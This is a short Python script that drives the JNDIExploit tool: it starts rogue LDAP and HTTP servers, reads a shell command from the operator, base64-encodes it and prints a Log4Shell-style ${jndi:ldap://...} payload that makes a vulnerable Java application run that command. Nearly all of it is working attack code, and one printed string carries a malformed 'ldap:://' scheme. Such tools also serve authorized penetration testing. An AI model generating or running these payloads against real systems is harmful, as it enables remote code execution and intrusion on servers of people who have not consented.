import subprocess,os,sys,base64
Path="java"
LDAP_Port="3380"
HTTP_Port="8000"
Host = "127.0.0.1"
command=[Path,"-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip",Host,"-p",HTTP_Port,"-l",LDAP_Port]
subp = os.system(" ".join(command)+" -u")

print("Generate:${jndi:ldap:://127.0.0.1/} ")
Command = base64.b64encode(raw_input("Input Command:"))
print("Test Payload:${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/%s}"%Command)
subp = os.system(" ".join(command))
